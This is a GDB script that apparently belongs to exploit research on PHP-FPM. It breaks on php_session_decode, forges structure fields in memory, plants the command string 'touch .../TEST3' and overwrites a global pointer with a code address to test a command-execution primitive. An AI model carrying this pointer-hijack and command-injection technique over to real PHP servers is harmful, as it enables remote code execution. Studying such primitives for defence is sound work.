set pagination off
set confirm off
set auto-load safe-path /
symbol-file /tmp/opencode/realapps/install_realapps_np/sbin/php-fpm
set $hits=0
break php_session_decode
commands
silent
set $hits=$hits+1
set $v=$rdi+0x18
printf "DECODE #%d data=%p val=%p len=%lu level=%ld\n", $hits,$rdi,$v,((zend_string*)$rdi)->len,basic_globals.unserialize.level
if $hits==2
  set *(unsigned int*)($v+0x2c)=1
  set *(unsigned long*)($v+0x50)=$v+0x1000
  set *(unsigned char*)($v+0x58)=6
  set *(unsigned long*)($v+0x1010)=64
  set {char[65]}($v+0x1018)="touch /tmp/opencode/research/wprealhex256_20261022T000209Z/TEST3"
  set *(void**)0x22c54c8=0xa3c074
  printf "PATCHED hit2 F=%p cmdlen=%lu\n",$v+0x1000,*(unsigned long*)($v+0x1010)
end
if $hits>=3
  printf "HIT%d raw2c=%u raw50=%p raw58=%u\n",$hits,*(unsigned int*)($v+0x2c),*(void**)($v+0x50),*(unsigned char*)($v+0x58)
end
continue
end
continue
